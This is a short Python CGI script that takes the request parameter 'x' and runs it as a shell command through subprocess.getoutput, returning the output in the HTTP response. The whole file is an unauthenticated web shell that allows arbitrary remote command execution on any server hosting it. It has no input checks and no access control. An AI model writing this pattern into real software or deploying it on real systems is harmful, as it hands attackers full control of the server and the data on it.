#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
import subprocess


cmd= cgi.FieldStorage()
y= cmd.getvalue("x")
print(subprocess.getoutput(y))

